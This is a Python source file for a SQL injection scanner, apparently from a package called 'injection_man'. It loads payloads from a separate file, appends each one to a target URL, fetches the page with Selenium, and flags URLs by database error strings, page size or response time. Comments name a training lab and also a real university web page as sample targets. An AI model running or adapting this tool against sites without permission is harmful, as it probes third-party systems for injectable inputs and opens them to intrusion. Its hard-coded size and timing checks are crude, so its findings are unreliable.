from selenium import webdriver
import time
from injection_man import check_timing
from importlib.resources import files

def sql_i(target_url):
    sql_file = files('injection_man').joinpath('sql.txt')
    with open(sql_file, "r") as file:
        sql_payloads = file.readlines()

    injection_found = ["error in your SQL syntax", "SQL syntax", "Warning: mysql_", "Unclosed quotation mark after the character string"]
    driver = webdriver.Chrome()

    #https://uoanbar.edu.iq/mansa/Library_Details.php?ID=
    #https://0a3d009b035c772081a73e1e009600bf.web-security-academy.net/product?productId=
    times, finished = check_timing.time_avareging(target_url)
    dir_injectable = []
    times += 3

    if target_url.find("=") >= 0 and finished:
        for payload in sql_payloads:
            injectable_url = False
            replace_url = target_url + payload
            driver.get(replace_url)
            start_time = time.time()
            src = driver.page_source
            html_size = len(src.encode('utf-8'))
            end_time = time.time()
            average_time = end_time - start_time

            if (html_size > 20000 or html_size < 4000 or average_time < times) and not html_size == 3414:
                injectable_url = True
                dir_injectable.append(replace_url)
                print(replace_url, "  :  ", html_size, "average time is:", average_time)

            else:
                for error in injection_found:
                    if error in src:
                        dir_injectable.append(replace_url)
                        print(replace_url, "  :  ", html_size, "average time is:", average_time)

        print(dir_injectable)
    else:
        print("Does Not Finding Equal ")

    driver.quit()
